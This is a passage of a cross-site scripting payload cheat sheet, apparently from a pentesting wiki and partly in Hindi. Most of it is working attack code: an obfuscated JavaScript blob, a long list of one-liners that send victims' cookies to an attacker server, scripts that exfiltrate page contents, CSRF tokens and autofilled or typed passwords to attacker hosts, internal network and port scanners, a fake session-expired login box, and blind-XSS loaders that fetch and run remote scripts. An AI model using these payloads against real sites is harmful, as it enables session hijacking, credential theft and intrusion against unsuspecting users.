ﾟДﾟ["c"] = (ﾟДﾟ + "_")[ﾟｰﾟ + ﾟｰﾟ - ﾟΘﾟ]
ﾟДﾟ["o"] = (ﾟДﾟ + "_")[ﾟΘﾟ]
ﾟoﾟ =
ﾟДﾟ["c"] +
ﾟДﾟ["o"] +
(ﾟωﾟﾉ + "_")[ﾟΘﾟ] +
((ﾟωﾟﾉ == 3) + "_")[ﾟｰﾟ] +
(ﾟДﾟ + "_")[ﾟｰﾟ + ﾟｰﾟ] +
((ﾟｰﾟ == 3) + "_")[ﾟΘﾟ] +
((ﾟｰﾟ == 3) + "_")[ﾟｰﾟ - ﾟΘﾟ] +
ﾟДﾟ["c"] +
(ﾟДﾟ + "_")[ﾟｰﾟ + ﾟｰﾟ] +
ﾟДﾟ["o"] +
((ﾟｰﾟ == 3) + "_")[ﾟΘﾟ]
ﾟДﾟ["_"] = (o ^ _ ^ o)[ﾟoﾟ][ﾟoﾟ]
ﾟεﾟ =
((ﾟｰﾟ == 3) + "_")[ﾟΘﾟ] +
ﾟДﾟ.ﾟДﾟﾉ +
(ﾟДﾟ + "_")[ﾟｰﾟ + ﾟｰﾟ] +
((ﾟｰﾟ == 3) + "_")[o ^ _ ^ (o - ﾟΘﾟ)] +
((ﾟｰﾟ == 3) + "_")[ﾟΘﾟ] +
(ﾟωﾟﾉ + "_")[ﾟΘﾟ]
ﾟｰﾟ += ﾟΘﾟ
ﾟДﾟ[ﾟεﾟ] = "\\"
ﾟДﾟ.ﾟΘﾟﾉ = (ﾟДﾟ + ﾟｰﾟ)[o ^ _ ^ (o - ﾟΘﾟ)]
oﾟｰﾟo = (ﾟωﾟﾉ + "_")[c ^ _ ^ o]
ﾟДﾟ[ﾟoﾟ] = '"'
ﾟДﾟ["_"](
ﾟДﾟ["_"](
ﾟεﾟ +
ﾟДﾟ[ﾟoﾟ] +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟｰﾟ +
ﾟΘﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟｰﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟｰﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
((o ^ _ ^ o) - ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
ﾟｰﾟ +
ﾟДﾟ[ﾟεﾟ] +
(ﾟｰﾟ + ﾟΘﾟ) +
(c ^ _ ^ o) +
ﾟДﾟ[ﾟεﾟ] +
ﾟｰﾟ +
((o ^ _ ^ o) - ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟΘﾟ +
(c ^ _ ^ o) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟｰﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟｰﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟｰﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
(ﾟｰﾟ + (o ^ _ ^ o)) +
ﾟДﾟ[ﾟεﾟ] +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟｰﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟｰﾟ +
(c ^ _ ^ o) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟΘﾟ +
((o ^ _ ^ o) - ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟｰﾟ +
ﾟΘﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟｰﾟ +
ﾟΘﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) - ﾟΘﾟ) +
(o ^ _ ^ o) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟｰﾟ +
(o ^ _ ^ o) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
((o ^ _ ^ o) - ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟΘﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
(c ^ _ ^ o) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
ﾟｰﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟｰﾟ +
((o ^ _ ^ o) - ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟΘﾟ +
ﾟДﾟ[ﾟoﾟ]
)(ﾟΘﾟ)
)("_")
```

```javascript
// It's also possible to execute JS code only with the chars: []`+!${}
```
## XSS सामान्य payloads

### 1 में कई payloads


{{#ref}}
steal-info-js.md
{{#endref}}

### Iframe Trap

यूज़र को पेज पर iframe से बाहर निकले बिना नेविगेट करवाएँ और उसके क्रियाकलाप चुराएँ (जिसमें फ़ॉर्म में भेजी गई जानकारी शामिल है):


{{#ref}}
../iframe-traps.md
{{#endref}}

### Cookies प्राप्त करें
```javascript
<img src=x onerror=this.src="http://<YOUR_SERVER_IP>/?c="+document.cookie>
<img src=x onerror="location.href='http://<YOUR_SERVER_IP>/?c='+ document.cookie">
<script>new Image().src="http://<IP>/?c="+encodeURI(document.cookie);</script>
<script>new Audio().src="http://<IP>/?c="+escape(document.cookie);</script>
<script>location.href = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>location = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>document.location = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>document.location.href = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>document.write('<img src="http://<YOUR_SERVER_IP>?c='+document.cookie+'" />')</script>
<script>window.location.assign('http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie)</script>
<script>window['location']['assign']('http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie)</script>
<script>window['location']['href']('http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie)</script>
<script>document.location=["http://<YOUR_SERVER_IP>?c",document.cookie].join()</script>
<script>var i=new Image();i.src="http://<YOUR_SERVER_IP>/?c="+document.cookie</script>
<script>window.location="https://<SERVER_IP>/?c=".concat(document.cookie)</script>
<script>var xhttp=new XMLHttpRequest();xhttp.open("GET", "http://<SERVER_IP>/?c="%2Bdocument.cookie, true);xhttp.send();</script>
<script>eval(atob('ZG9jdW1lbnQud3JpdGUoIjxpbWcgc3JjPSdodHRwczovLzxTRVJWRVJfSVA+P2M9IisgZG9jdW1lbnQuY29va2llICsiJyAvPiIp'));</script>
<script>fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net', {method: 'POST', mode: 'no-cors', body:document.cookie});</script>
<script>navigator.sendBeacon('https://ssrftest.com/x/AAAAA',document.cookie)</script>
```
> [!TIP]
> आप **JavaScript से cookies तक पहुँच नहीं पाएँगे** यदि cookie में HTTPOnly flag सेट हो। पर यहाँ [some ways to bypass this protection](../hacking-with-cookies/index.html#httponly) हैं अगर आप किस्मत वाले हों।

### पृष्ठ सामग्री चुराएँ
```javascript
var url = "http://10.10.10.25:8000/vac/a1fbf2d1-7c3f-48d2-b0c3-a205e54e09e8"
var attacker = "http://10.10.14.8/exfil"
var xhr = new XMLHttpRequest()
xhr.onreadystatechange = function () {
if (xhr.readyState == XMLHttpRequest.DONE) {
fetch(attacker + "?" + encodeURI(btoa(xhr.responseText)))
}
}
xhr.open("GET", url, true)
xhr.send(null)
```
### आंतरिक IPs खोजें
```html
<script>
var q = []
var collaboratorURL =
"http://5ntrut4mpce548i2yppn9jk1fsli97.burpcollaborator.net"
var wait = 2000
var n_threads = 51

// Prepare the fetchUrl functions to access all the possible
for (i = 1; i <= 255; i++) {
q.push(
(function (url) {
return function () {
fetchUrl(url, wait)
}
})("http://192.168.0." + i + ":8080")
)
}

// Launch n_threads threads that are going to be calling fetchUrl until there is no more functions in q
for (i = 1; i <= n_threads; i++) {
if (q.length) q.shift()()
}

function fetchUrl(url, wait) {
console.log(url)
var controller = new AbortController(),
signal = controller.signal
fetch(url, { signal })
.then((r) =>
r.text().then((text) => {
location =
collaboratorURL +
"?ip=" +
url.replace(/^http:\/\//, "") +
"&code=" +
encodeURIComponent(text) +
"&" +
Date.now()
})
)
.catch((e) => {
if (!String(e).includes("The user aborted a request") && q.length) {
q.shift()()
}
})

setTimeout((x) => {
controller.abort()
if (q.length) {
q.shift()()
}
}, wait)
}
</script>
```
### Port Scanner (fetch)
```javascript
const checkPort = (port) => { fetch(http://localhost:${port}, { mode: "no-cors" }).then(() => { let img = document.createElement("img"); img.src = http://attacker.com/ping?port=${port}; }); } for(let i=0; i<1000; i++) { checkPort(i); }
```
### Port Scanner (websockets)
```python
var ports = [80, 443, 445, 554, 3306, 3690, 1234];
for(var i=0; i<ports.length; i++) {
var s = new WebSocket("wss://192.168.1.1:" + ports[i]);
s.start = performance.now();
s.port = ports[i];
s.onerror = function() {
console.log("Port " + this.port + ": " + (performance.now() -this.start) + " ms");
};
s.onopen = function() {
console.log("Port " + this.port+ ": " + (performance.now() -this.start) + " ms");
};
}
```
_कम समय प्रतिक्रिया देने वाले पोर्ट को दर्शाता है_ _लंबा समय प्रतिक्रिया न होने का संकेत देता है._

Chrome में प्रतिबंधित पोर्टों की सूची [**here**](https://src.chromium.org/viewvc/chrome/trunk/src/net/base/net_util.cc) देखें और Firefox में [**here**](https://www-archive.mozilla.org/projects/netlib/portbanning#portlist) देखें।

### credentials पूछने के लिए बॉक्स
```html
<style>::placeholder { color:white; }</style><script>document.write("<div style='position:absolute;top:100px;left:250px;width:400px;background-color:white;height:230px;padding:15px;border-radius:10px;color:black'><form action='https://example.com/'><p>Your sesion has timed out, please login again:</p><input style='width:100%;' type='text' placeholder='Username' /><input style='width: 100%' type='password' placeholder='Password'/><input type='submit' value='Login'></form><p><i>This login box is presented using XSS as a proof-of-concept</i></p></div>")</script>
```
### ऑटो-फिल पासवर्ड कैप्चर
```javascript
<b>Username:</><br>
<input name=username id=username>
<b>Password:</><br>
<input type=password name=password onchange="if(this.value.length)fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```
जब भी कोई डेटा password field में डाला जाता है, username और password attackers server को भेज दिया जाता है — यहां तक कि अगर client एक saved password चुनता है और कुछ लिखता नहीं है, तब भी credentials ex-filtrated हो जाएंगे।

### Hijack form handlers to exfiltrate credentials (const shadowing)

If a critical handler (e.g., `function DoLogin(){...}`) is declared later in the page, and your payload runs earlier (e.g., via an inline JS-in-JS sink), define a `const` with the same name first to preempt and lock the handler. Later function declarations cannot rebind a `const` name, leaving your hook in control:
```javascript
const DoLogin = () => {
const pwd  = Trim(FormInput.InputPassword.value);
const user = Trim(FormInput.InputUtente.value);
fetch('https://attacker.example/?u='+encodeURIComponent(user)+'&p='+encodeURIComponent(pwd));
};
```
नोट्स
- यह execution order पर निर्भर करता है: आपका injection वैध declaration से पहले execute होना चाहिए।
- यदि आपका payload `eval(...)` में wrapped है, तो `const/let` bindings globals नहीं बनेंगे। एक सच्चा global, non-rebindable binding सुनिश्चित करने के लिए सेक्शन “Deliverable payloads with eval(atob()) and scope nuances” में बताई गई dynamic `<script>` injection technique का उपयोग करें।
- जब keyword filters कोड को ब्लॉक करते हैं, तो ऊपर दिखाए गए अनुसार Unicode-escaped identifiers या `eval(atob('...'))` delivery के साथ combine करें।

### Keylogger

github में खोजने पर मुझे कुछ अलग-अलगे मिलें:

- [https://github.com/JohnHoder/Javascript-Keylogger](https://github.com/JohnHoder/Javascript-Keylogger)
- [https://github.com/rajeshmajumdar/keylogger](https://github.com/rajeshmajumdar/keylogger)
- [https://github.com/hakanonymos/JavascriptKeylogger](https://github.com/hakanonymos/JavascriptKeylogger)
- आप metasploit `http_javascript_keylogger` का भी उपयोग कर सकते हैं

### CSRF tokens की चोरी
```javascript
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/email',true);
req.send();
function handleResponse() {
var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
var changeReq = new XMLHttpRequest();
changeReq.open('post', '/email/change-email', true);
changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>
```
### PostMessage संदेश चुराना
```html
<img src="https://attacker.com/?" id=message>
<script>
window.onmessage = function(e){
document.getElementById("message").src += "&"+e.data;
</script>
```
### Service Workers का दुरुपयोग


{{#ref}}
abusing-service-workers.md
{{#endref}}

### Shadow DOM तक पहुँचना


{{#ref}}
shadow-dom.md
{{#endref}}

### Polyglots


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/xss_polyglots.txt
{{#endref}}

### Blind XSS payloads

आप यह भी उपयोग कर सकते हैं: [https://xsshunter.com/](https://xsshunter.com)
```html
"><img src='//domain/xss'>
"><script src="//domain/xss.js"></script>
><a href="javascript:eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')">Click Me For An Awesome Time</a>
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//0mnb1tlfl5x4u55yfb57dmwsajgd42.burpcollaborator.net/scriptb");a.send();</script>

<!-- html5sec - Self-executing focus event via autofocus: -->
"><input onfocus="eval('d=document; _ = d.createElement(\'script\');_.src=\'\/\/domain/m\';d.body.appendChild(_)')" autofocus>

<!-- html5sec - JavaScript execution via iframe and onload -->
"><iframe onload="eval('d=document; _=d.createElement(\'script\');_.src=\'\/\/domain/m\';d.body.appendChild(_)')">

<!-- html5sec - SVG tags allow code to be executed with onload without any other elements. -->
"><svg onload="javascript:eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')" xmlns="http://www.w3.org/2000/svg"></svg>

<!-- html5sec -  allow error handlers in <SOURCE> tags if encapsulated by a <VIDEO> tag. The same works for <AUDIO> tags  -->
"><video><source onerror="eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')">

<!--  html5sec - eventhandler -  element fires an "onpageshow" event without user interaction on all modern browsers. This can be abused to bypass blacklists as the event is not very well known.  -->
"><body onpageshow="eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')">

<!-- xsshunter.com - Sites that use JQuery -->
<script>$.getScript("//domain")</script>

<!-- xsshunter.com - When <script> is filtered -->
"><img src=x id=payload&#61;&#61; onerror=eval(atob(this.id))>

<!-- xsshunter.com - Bypassing poorly designed systems with autofocus -->
"><input onfocus=eval(atob(this.id)) id=payload&#61;&#61; autofocus>

<!-- noscript trick -->
<noscript><p title="</noscript><img src=x onerror=alert(1)>">

<!-- whitelisted CDNs in CSP -->
"><script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.1/angular.js"></script>
<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.1/angular.min.js"></script>
<!-- ... add more CDNs, you'll get WARNING: Tried to load angular more than once if multiple load. but that does not matter you'll get a HTTP interaction/exfiltration :-]... -->
<div ng-app ng-csp><textarea autofocus ng-focus="d=$event.view.document;d.location.hash.match('x1') ? '' : d.location='//localhost/mH/'"></textarea></div>

<!-- Payloads from https://www.intigriti.com/researchers/blog/hacking-tools/hunting-for-blind-cross-site-scripting-xss-vulnerabilities-a-complete-guide -->
<!-- Image tag -->
'"><img src="x" onerror="eval(atob(this.id))" id="Y29uc3QgeD1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTt4LnNyYz0ne1NFUlZFUn0vc2NyaXB0LmpzJztkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHgpOw==">

<!-- Input tag with autofocus -->
'"><input autofocus onfocus="eval(atob(this.id))" id="Y29uc3QgeD1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTt4LnNyYz0ne1NFUlZFUn0vc2NyaXB0LmpzJztkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHgpOw==">

<!-- In case jQuery is loaded, we can make use of the getScript method -->
'"><script>$.getScript("{SERVER}/script.js")</script>

<!-- Make use of the JavaScript protocol (applicable in cases where your input lands into the "href" attribute or a specific DOM sink) -->
javascript:eval(atob("Y29uc3QgeD1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTt4LnNyYz0ne1NFUlZFUn0vc2NyaXB0LmpzJztkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHgpOw=="))

<!-- Render an iframe to validate your injection point and receive a callback -->
'"><iframe src="{SERVER}"></iframe>

<!-- Bypass certain Content Security Policy (CSP) restrictions with a base tag -->
<base href="{SERVER}" />

<!-- Make use of the meta-tag to initiate a redirect -->
<meta http-equiv="refresh" content="0; url={SERVER}" />

<!-- In case your target makes use of AngularJS -->
{{constructor.constructor("import('{SERVER}/script.js')")()}}
```
### Regex - छिपी हुई सामग्री तक पहुँच

From [**this writeup**](https://blog.arkark.dev/2022/11/18/seccon-en/#web-piyosay) से पता चलता है कि भले ही कुछ values JS से गायब हो जाएँ, फिर भी उन्हें विभिन्न objects के JS attributes में ढूँढा जा सकता है। For example, an input of a REGEX is still possible to find it after the value of the input of the regex was removed:
```javascript
// Do regex with flag
flag = "CTF{FLAG}"
re = /./g
re.test(flag)

// Remove flag value, nobody will be able to get it, right?
flag = ""

// Access previous regex input
console.log(RegExp.input)
console.log(RegExp.rightContext)
console.log(
document.all["0"]["ownerDocument"]["defaultView"]["RegExp"]["rightContext"]
)
```
### Brute-Force List


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/xss.txt
{{#endref}}

## XSS अन्य कमजोरियों का दुरुपयोग

### Markdown में XSS

क्या आप ऐसा Markdown कोड inject कर सकते हैं जो render होगा? शायद आपको XSS मिल सकता है! देखें:


{{#ref}}
xss-in-markdown.md
{{#endref}}

### XSS to SSRF

क्या आपको किसी साइट पर XSS मिला है जो caching का उपयोग करती है? Edge Side Include Injection के माध्यम से इस payload से इसे SSRF में upgrade करने की कोशिश करें:
```python
<esi:include src="http://yoursite.com/capture" />
```
Use it to bypass cookie restrictions, XSS filters and much more!\
More information about this technique here: [**XSLT**](../xslt-server-side-injection-extensible-stylesheet-language-transformations.md).

### XSS डायनामिक रूप से बनाई गई PDF में

यदि कोई वेब पेज यूजर कंट्रोल्ड इनपुट का उपयोग करके PDF बना रहा है, तो आप PDF बना रहे बॉट को **बेपहमी में डालकर** **arbitrary JS code को निष्पादित** करवा सकते हैं।\
तो, अगर **PDF creator bot को** किसी प्रकार के **HTML** **टैग्स** मिलते हैं, तो वह उन्हें **interpret** करेगा, और आप इस व्यवहार का **abuse** करके **Server XSS** का कारण बन सकते हैं।

{{#ref}}
server-side-xss-dynamic-pdf.md
{{#endref}}

यदि आप HTML टैग्स इंजेक्ट नहीं कर पा रहे हैं तो **PDF data इंजेक्ट** करने की कोशिश करना फायदेमंद हो सकता है:


{{#ref}}
pdf-injection.md
{{#endref}}

### XSS in Amp4Email

AMP, जिसका उद्देश्य मोबाइल डिवाइसों पर वेब पेज प्रदर्शन को तेज करना है, HTML टैग्स को JavaScript के साथ जोड़ता है ताकि गति और सुरक्षा पर जोर देते हुए कार्यक्षमता सुनिश्चित की जा सके। यह विभिन्न सुविधाओं के लिए कई components को सपोर्ट करता है, जिन्हें [AMP components](https://amp.dev/documentation/components/?format=websites) के माध्यम से एक्सेस किया जा सकता है।

The [**AMP for Email**](https://amp.dev/documentation/guides-and-tutorials/learn/email-spec/amp-email-format/) format extends specific AMP components to emails, enabling recipients to interact with content directly within their emails.

Example [**writeup XSS in Amp4Email in Gmail**](https://adico.me/post/xss-in-gmail-s-amp4email).

### XSS फाइल अपलोड (svg)

इमेज के रूप में निम्नलिखित जैसी फ़ाइल अपलोड करें (स्रोत: [http://ghostlulz.com/xss-svg/](http://ghostlulz.com/xss-svg/)):
```html
Content-Type: multipart/form-data; boundary=---------------------------232181429808
Content-Length: 574
-----------------------------232181429808
Content-Disposition: form-data; name="img"; filename="img.svg"
Content-Type: image/svg+xml

<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
<rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
<script type="text/javascript">
alert(1);
</script>
</svg>
-----------------------------232181429808--
```

```html
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
<script type="text/javascript">alert("XSS")</script>
</svg>
```

```html
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
<polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
<script type="text/javascript">
alert("XSS");
</script>
</svg>
```

```svg
<svg width="500" height="500"
xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
<circle cx="50" cy="50" r="45" fill="green"
id="foo"/>

<foreignObject width="500" height="500">
<iframe xmlns="http://www.w3.org/1999/xhtml" src="data:text/html,&lt;body&gt;&lt;script&gt;document.body.style.background=&quot;red&quot;&lt;/script&gt;hi&lt;/body&gt;" width="400" height="250"/>
<iframe xmlns="http://www.w3.org/1999/xhtml" src="javascript:document.write('hi');" width="400" height="250"/>
</foreignObject>
</svg>
```

```html
<svg><use href="//portswigger-labs.net/use_element/upload.php#x" /></svg>
```

```xml
<svg><use href="data:image/svg+xml,&lt;svg id='x' xmlns='http://www.w3.org/2000/svg' &gt;&lt;image href='1' onerror='alert(1)' /&gt;&lt;/svg&gt;#x" />
```
खोजें **और अधिक SVG payloads में** [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)

## विविध JS ट्रिक्स और संबंधित जानकारी


{{#ref}}
other-js-tricks.md
{{#endref}}

## XSS संसाधन

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20injection)
- [http://www.xss-payloads.com](http://www.xss-payloads.com) [https://github.com/Pgaijin66/XSS-Payloads/blob/master/payload.txt](https://github.com/Pgaijin66/XSS-Payloads/blob/master/payload.txt) [https://github.com/materaj/xss-list](https://github.com/materaj/xss-list)
- [https://github.com/ismailtasdelen/xss-payload-list](https://github.com/ismailtasdelen/xss-payload-list)
- [https://gist.github.com/rvrsh3ll/09a8b933291f9f98e8ec](https://gist.github.com/rvrsh3ll/09a8b933291f9f98e8ec)
- [https://netsec.expert/2020/02/01/xss-in-2020.html](https://netsec.expert/2020/02/01/xss-in-2020.html)
- [https://www.intigriti.com/researchers/blog/hacking-tools/hunting-for-blind-cross-site-scripting-xss-vulnerabilities-a-complete-guide](https://www.intigriti.com/researchers/blog/hacking-tools/hunting-for-blind-cross-site-scripting-xss-vulnerabilities-a-complete-guide)

## संदर्भ

- [From "Low-Impact" RXSS to Credential Stealer: A JS-in-JS Walkthrough](https://r3verii.github.io/bugbounty/2025/08/25/rxss-credential-stealer.html)
- [MDN eval()](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval)

{{#include ../../banners/hacktricks-training.md}}
